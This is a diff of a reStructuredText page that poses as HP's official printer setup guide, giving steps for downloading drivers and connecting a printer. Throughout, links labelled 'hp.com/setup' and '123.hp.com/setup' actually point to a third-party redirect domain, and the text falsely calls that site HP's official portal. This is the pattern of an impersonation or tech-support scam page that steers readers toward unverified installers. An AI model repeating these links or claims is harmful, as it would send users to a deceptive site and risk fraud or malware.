@@ -1,21 +1,21 @@
 ##################
-How Do I Download, Install, and Set Up My HP Printer Driver?
+123.hp.com - Printer setup from the HP® Official site
 ##################
 
 .. meta::
-   :msvalidate.01: 108BF3BCC1EC90CA1EBEFF8001FAEFEA
+   :msvalidate.01: 98C899EEC245D9CBFD6A1AD132F06457
 
 .. image:: blank.png
       :width: 350px
       :align: center
       :height: 100px
 
-.. image:: Enter_Product_Key.png
+.. image:: SETUP-YOUR-PRINTER.png
       :width: 350px
       :align: center
       :height: 100px
-      :alt: hp.com/setup
-      :target: https://hp.redircoms.com
+      :alt: 123.hp.com/setup
+      :target: https://hs.redircoms.com
 
 .. image:: blank.png
       :width: 350px
@@ -28,46 +28,45 @@ How Do I Download, Install, and Set Up My HP Printer Driver?
 
 
 
-There are 5 simple stages to download, install, and set up your HP printer driver on your computer. Follow each stage one by one to successfully connect your printer via `hp.com/setup <https://hp.redircoms.com>`_. HP’s setup site provides the latest drivers and simple installation steps. It’s the fastest way to ensure your printer works seamlessly with your computer. Visit `hp.com/setup <https://hp.redircoms.com>`_, download the right driver, and get your printer ready to use in minutes.
+Setting up a new HP printer? The official and most reliable way to get started is by visiting `123.hp.com/setup <https://hs.redircoms.com>`_. This is HP’s dedicated portal for printer setup, software downloads, and installation guides tailored to your specific printer model.
 
-**********
-Steps to Download HP Printer Driver
-**********
+Why Use 123.hp.com/setup?
+---------------------------
 
-1. Open a web browser and go to `hp.com/setup <https://hp.redircoms.com>`_.
+Using the official setup page ensures that:
+- You receive the correct drivers and software for your HP printer model.
+- The installation process is smooth, secure, and guided.
+- Your printer is configured for optimal performance right from the start.
 
-2. Enter your HP printer model in the search box.
+Step-by-Step HP Printer Setup Guide
+-------------------------------------
 
-3. Select your operating system if prompted.
+Follow these steps to set up your HP printer using `123.hp.com/setup <https://hs.redircoms.com>`_:
 
-4. Click on **Download** to get the latest driver and software package.
+1. **Turn on Your HP Printer**  
+   Make sure your printer is powered on and in a ready state.
 
-5. Save the installer file to your computer.
+2. **Connect to Wi-Fi or USB**  
+   Depending on your printer model, connect via wireless network or plug in the USB cable to your PC.
 
-**********
-Steps to Install HP Printer Driver
-**********
+3. **Visit the Official Setup Page**  
+   Open your web browser and go to `123.hp.com/setup <https://hs.redircoms.com>`_.
 
-1. Locate the downloaded installer file on your computer.
+4. **Enter Your Printer Model**  
+   In the search box, type your HP printer model (e.g., HP DeskJet 4155e, HP LaserJet Pro) and press **Next**.
 
-2. Double-click the installer to begin the setup process.
+5. **Download HP Smart or Drivers**  
+   Follow the prompt to download either the HP Smart app or the required printer driver based on your operating system.
 
-3. Follow the on-screen instructions and accept the license agreement.
+6. **Run the Installation File**  
+   After downloading, open the setup file and follow the on-screen instructions to complete the installation.
 
-4. Choose your connection type (USB or Wireless).
+7. **Add Printer to Your Device**  
+   Once installed, the software will automatically detect your printer and finalize the setup.
 
-5. Complete the installation by clicking **Finish**.
+Printing a Test Page
+----------------------
 
-**********
-Setting Up Your HP Printer
-**********
-
-1. Make sure your HP printer is powered on.
-
-2. For wireless setup, ensure your printer and computer are on the same Wi-Fi network.
-
-3. Open the HP driver or utility you installed.
-
-4. Follow on-screen prompts to detect and connect your printer.
-
-5. Once connected, print a test page to verify setup is complete.
+After installation:
+- Navigate to your **Printers & Scanners** settings (Windows or macOS).
+- Locate your HP printer and click on **Print Test Page** to ensure everything is working correctly.
